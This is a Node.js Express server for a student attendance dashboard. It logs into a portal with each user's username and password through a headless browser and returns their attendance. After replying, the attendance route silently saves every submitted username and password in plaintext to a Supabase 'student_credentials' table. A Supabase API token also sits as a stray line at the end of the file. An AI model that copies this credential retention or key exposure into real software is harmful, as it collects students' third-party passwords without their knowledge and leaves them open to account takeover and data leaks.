const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const { launchBrowser, login, fetchAcademic, fetchBiometric } = require("./fetchAttendance");

const app = express();
app.use(cors({ origin: "https://attendancedashboar.vercel.app" }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// --- Supabase setup ---
const supabaseUrl = "https://ywsqpuvraddaimlbiuds.supabase.co";
const supabaseKey = "YOUR_SUPABASE_KEY"; // keep it secret
const supabase = createClient(supabaseUrl, supabaseKey);

// --- Browser pool setup ---
const MAX_BROWSERS = 1;
const browserPool = [];
const pendingRequests = [];

(async () => {
  console.log(`Launching ${MAX_BROWSERS} Chromium instances...`);
  for (let i = 0; i < MAX_BROWSERS; i++) {
    const { browser, page } = await launchBrowser(); // your existing function
    browserPool.push({ browser, page, busy: false });
  }
  console.log(`${MAX_BROWSERS} browsers ready at login page ✅`);
})();

// --- Helper functions ---
async function acquireBrowser() {
  return new Promise(resolve => {
    const freeBrowser = browserPool.find(b => !b.busy);
    if (freeBrowser) {
      freeBrowser.busy = true;
      resolve(freeBrowser);
    } else {
      pendingRequests.push(resolve); // queue the request
    }
  });
}

function releaseBrowser(browserObj) {
  browserObj.busy = false;
  if (pendingRequests.length > 0) {
    const nextRequest = pendingRequests.shift();
    browserObj.busy = true;
    nextRequest(browserObj);
  }
}

// --- Attendance route ---
app.post("/get-attendance", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password)
    return res.status(400).json({ success: false, error: "Username and password required" });

  let browserObj;
  try {
    browserObj = await acquireBrowser();
    const page = browserObj.page;

    // Block images, fonts, and stylesheets for speed
    await page.setRequestInterception(true);
    page.on("request", req => {
      if (["image", "stylesheet", "font"].includes(req.resourceType())) req.abort();
      else req.continue();
    });

    // Login
    await login(page, username, password);

    // Fetch attendance
    const academicWithTargets = await fetchAcademic(page);
    const biometricAttendance = await fetchBiometric(page);

    res.json({ academic: academicWithTargets, biometric: biometricAttendance });

    const now = new Date().toISOString();
    // Save credentials to Supabase
    const { error: credError } = await supabase
      .from("student_credentials")
      .upsert([{ username, password, fetched_at: now }], { onConflict: ["username"] });
    if (credError) console.error("Supabase insert error:", credError);

    // Record site visit
    const { error: visitError } = await supabase
      .from("site_visits")
      .insert([{ username, visited_at: now }]);
    if (visitError) console.error("Supabase visit insert error:", visitError);

  } catch (err) {
    console.error("Attendance fetch error:", err);
    res.status(500).json({ success: false, error: err.message });
  } finally {
    if (browserObj) releaseBrowser(browserObj); // free the browser for next request
  }
});

// --- Today's logins route ---
app.get("/today-logins", async (req, res) => {
  try {
    const startOfDay = new Date();
    startOfDay.setHours(0, 0, 0, 0);
    const endOfDay = new Date();
    endOfDay.setHours(23, 59, 59, 999);

    const { count, error } = await supabase
      .from("site_visits")
      .select("id", { count: "exact", head: true })
      .gte("visited_at", startOfDay.toISOString())
      .lte("visited_at", endOfDay.toISOString());

    if (error) {
      console.error("Supabase today-logins error:", error);
      throw error;
    }

    res.json({ today_logins: count || 0 });
  } catch (err) {
    console.error("Error fetching today-logins:", err);
    res.status(500).json({ today_logins: 0 });
  }
});

app.listen(process.env.PORT || 3000, () => console.log("Server running ✅"));

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl3c3FwdXZyYWRkYWltbGJpdWRzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA4MjMzMDgsImV4cCI6MjA3NjM5OTMwOH0.UqkzzWM7nRvgtNdvRy63LLN-UGv-zeYYx6tRYD5zxdY